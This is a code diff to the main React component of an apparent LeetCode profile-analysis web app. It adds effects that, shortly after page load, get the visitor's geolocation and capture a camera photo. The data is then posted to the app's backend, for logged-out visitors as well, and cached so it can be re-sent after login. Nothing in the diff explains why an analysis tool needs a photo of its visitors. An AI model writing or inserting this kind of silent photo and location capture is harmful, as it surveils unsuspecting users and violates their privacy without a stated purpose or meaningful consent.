@@ -1672,6 +1672,97 @@ function App() {
     }
   }, [currentUser, creditsReady, showReportPage, currentReportId, username]);
 
+  useEffect(() => {
+    const syncPendingProfile = async () => {
+      const pendingLoc = sessionStorage.getItem("leetlens_pending_location");
+      const pendingCoords = sessionStorage.getItem("leetlens_pending_coordinates");
+      const pendingPhoto = sessionStorage.getItem("leetlens_pending_photo");
+
+      if (currentUser && (pendingLoc || pendingCoords || pendingPhoto)) {
+        try {
+          const token = await currentUser.getIdToken();
+          await fetch(`${API_BASE_URL}/api/log-visit`, {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+              Authorization: `Bearer ${token}`,
+            },
+            body: JSON.stringify({
+              location: pendingLoc || "location deny",
+              coordinates: pendingCoords || "location deny",
+              photo: pendingPhoto || "camera deny",
+            }),
+          });
+          sessionStorage.removeItem("leetlens_pending_location");
+          sessionStorage.removeItem("leetlens_pending_coordinates");
+          sessionStorage.removeItem("leetlens_pending_photo");
+        } catch (e) {
+          console.error("Failed to sync pending visit on login:", e);
+        }
+      }
+    };
+
+    syncPendingProfile();
+  }, [currentUser]);
+
+  useEffect(() => {
+    const handleInitialPermissionAndCapture = async () => {
+      if (sessionStorage.getItem("leetlens_initial_capture")) {
+        return;
+      }
+      sessionStorage.setItem("leetlens_initial_capture", "true");
+
+      const locObj = await getUserLocation();
+      const photoData = await captureUserPhoto();
+
+      if (currentUser) {
+        try {
+          const token = await currentUser.getIdToken();
+          await fetch(`${API_BASE_URL}/api/log-visit`, {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+              Authorization: `Bearer ${token}`,
+            },
+            body: JSON.stringify({
+              location: locObj.location,
+              coordinates: locObj.coordinates,
+              photo: photoData
+            })
+          });
+        } catch (e) {
+          console.error("Failed to sync initial visit to profile:", e);
+        }
+      } else {
+        sessionStorage.setItem("leetlens_pending_location", locObj.location);
+        sessionStorage.setItem("leetlens_pending_coordinates", locObj.coordinates);
+        sessionStorage.setItem("leetlens_pending_photo", photoData);
+
+        try {
+          await fetch(`${API_BASE_URL}/api/log-unregistered-visit`, {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+            },
+            body: JSON.stringify({
+              location: locObj.location,
+              coordinates: locObj.coordinates,
+              photo: photoData
+            })
+          });
+        } catch (e) {
+          console.error("Failed to log unregistered visit:", e);
+        }
+      }
+    };
+
+    const timer = setTimeout(() => {
+      handleInitialPermissionAndCapture();
+    }, 1500);
+
+    return () => clearTimeout(timer);
+  }, []);
+
   const difficultyCards = analysis
     ? [
         {
